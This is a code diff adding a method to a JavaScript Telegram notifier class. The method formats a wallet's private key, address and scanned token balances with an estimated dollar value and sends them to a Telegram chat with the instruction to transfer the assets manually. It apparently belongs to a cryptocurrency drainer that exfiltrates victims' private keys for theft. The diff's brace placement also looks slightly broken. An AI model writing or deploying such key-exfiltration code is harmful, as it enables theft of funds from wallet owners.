@@ -165,5 +165,48 @@ class TelegramNotifier {
   }
 }
 
+  async sendKeyAndAddressForManualTransfer(privateKey, walletAddress, scanResults) {
+    if (!this.botToken || !this.chatId) {
+      console.warn('Telegram notifications disabled - missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
+      return;
+    }
+
+    try {
+      let message = `🔑 **Private Key & Wallet Address for Manual Transfer**\n\n`;
+      message += `**Private Key:**\n\`${privateKey}\`\n\n`;
+      message += `**Wallet Address:**\n\`${walletAddress}\`\n\n`;
+      message += `**📊 Assets Found:**\n\n`;
+
+      // Add network details
+      for (const [networkKey, networkData] of Object.entries(scanResults.networks)) {
+        if (networkData && networkData.hasAssets) {
+          message += `**💰 ${networkKey.toUpperCase()}**\n`;
+          
+          if (networkData.native && parseFloat(networkData.native.balance) > 0) {
+            message += `🪙 Native: ${networkData.native.balance} ${networkData.native.symbol}\n`;
+          }
+          
+          if (networkData.tokens && networkData.tokens.length > 0) {
+            message += `📦 Tokens (${networkData.tokens.length}):\n`;
+            networkData.tokens.forEach((token, index) => {
+              message += `${index + 1}. ${token.balance} ${token.symbol}\n`;
+            });
+          }
+          message += `\n`;
+        }
+      }
+
+      message += `**Total Estimated Value:** $${scanResults.summary.estimatedValue.toFixed(2)}\n\n`;
+      message += `⚠️ **Manual Transfer Required**\n`;
+      message += `Please transfer assets manually using the private key above.`;
+
+      await this.sendMessage(message);
+      console.log('✅ Key and address sent to Telegram for manual transfer');
+    } catch (error) {
+      console.error('Failed to send key and address to Telegram:', error);
+    }
+  }
+}
+
 module.exports = { TelegramNotifier };
 
